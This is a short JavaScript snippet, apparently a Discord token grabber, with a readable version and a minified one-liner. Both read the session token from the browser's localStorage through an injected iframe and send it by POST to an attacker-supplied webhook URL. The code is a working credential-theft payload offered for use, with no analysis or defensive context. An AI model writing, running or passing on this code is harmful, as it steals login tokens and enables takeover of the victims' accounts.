// Replace `YOUR_WEBHOOK_URL` with your Webhook URL
let token = document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.token.slice(1, -1);
fetch("YOUR_WEBHOOK_URL", {
  "method": "POST",
  "headers": {
    "Content-Type": "application/json"
  },
  "body": JSON.stringify({
    content: token,
    embeds: null
  })
});

// Minified Version
fetch("YOUR_WEBHOOK_URL",{"method":"POST","headers":{"Content-Type":"application/json"},"body":JSON.stringify({content:document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.token.slice(1,-1),embeds: null})})